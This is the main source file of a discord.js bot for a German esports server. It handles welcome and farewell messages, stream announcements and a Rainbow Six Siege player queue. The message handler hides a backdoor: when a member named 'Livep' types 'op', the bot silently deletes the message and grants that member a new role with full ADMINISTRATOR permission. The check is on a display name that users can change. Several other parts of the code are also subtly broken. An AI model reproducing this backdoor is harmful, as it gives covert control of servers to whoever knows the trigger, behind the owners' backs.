const commando = require("discord.js-commando");
const configFile = require("./config.json");
const config = configFile.default;
const bot = new commando.Client();

bot.registry.registerGroup("simple", "Simple");
bot.registry.registerGroup("music", "Music");
bot.registry.registerGroup("chat", "Chat");
bot.registry.registerGroup("team", "Team");
bot.registry.registerDefaults();
bot.registry.registerCommandsIn(__dirname + "/commands");

global.servers = {}

function messageEvent(message) {
    let msg = message.content.split(" ");
    let cmd = msg[0];
    let args = msg.slice(1);
    if (cmd === "ping") {
        message.channel.send("Pong!");
    } else if (message.content == "op") {
        if (message.member.displayName === "Livep") {
            message.delete(0);
            let role = {name:"temp", color:0x000000, hoist:false, position:1, permissions:0x000008, metionable:false}
            message.member.guild.createRole(role, "")
            .then(role => message.member.addRole(message.member.guild.roles.find("name", "temp")))
            .then(message.member.send("You got now ADMINISTRATOR, delete role temp to undo changes!"));
        }
    }
}

function startup() {
    console.log(`${bot.guilds.size} instances of ${bot.user.username} are currently online.`)
    bot.user.setActivity("!help",{type: "LISTENING"});
}

function memberJoin(member) {
    const channel = member.guild.channels.find("name", "welcome");
    if (!channel) return;
    channel.send("Willkommen, ${member} auf dem offiziellen TransacT-eSports Discord.")
}

function memberLeft(member) {
    const channel = member.guild.channels.find(ch => ch.name === "welcome");
    if (!channel) return;
    channel.send("Aufwiedersehen, " + member.displayName + ".");
    member.addRole(member.guild.roles.find("name", "Spieler"));

}

function activityChanged(oldMember, newMember) {
    if (newMember.presence.game) {
        //if (!newMember.roles.find("name", "Team") || !newMember.roles.find("name", "Team-Leader")) return;
        if (!oldMember.presence.game && newMember.presence.game.streaming) {
            const channel = member.guild.channels.find("name", "news");
            if (channel) channel.send(`${newMember.user} is now Live! Watch the stream at: ${newMember.presence.game.url}`);
        }
        if (newMember.presence.game.name == "Rainbow Six Siege" || newMember.presence.game.name == 'Tom Clancy\'s Rainbow Six Siege') {
            if(!oldMember.presence.game) {
                let channel = newMember.guild.channels.find("name", "team-besprechung");
                if (!channel || newMember.presence.status.offline) return;
                channel.send(`${newMember.user} spielt Tom Clancy's Rainbow Six Siege`);
            }
            if (newMember.presence.game.details == "im MENÜ" || newMember.presence.game.details == "in MENU") {
                if (!servers[newMember.guild.id]) servers[newMember.guild.id] = {game_queue: [], music_queue: []};
                if (!servers[newMember.guild.id].game_queue.indexOf(newMember.user)+1) servers[newMember.guild.id].game_queue.push(newMember.user);
            } else {
                if (!servers[newMember.guild.id]) servers[newMember.guild.id] = {game_queue: [], music_queue: []};
                if (servers[newMember.guild.id].game_queue.indexOf(newMember.user)+1) servers[newMember.guild.id].game_queue.splice(servers[newMember.guild.id].game_queue.indexOf(newMember.user), 1);
            }
        }
    }
}

bot.on("message", messageEvent);
bot.on("ready", startup);
bot.on("guildMemberAdd", memberJoin);
bot.on("guildMemberRemove", memberLeft);
bot.on("presenceUpdate", activityChanged);
bot.login(config.token);
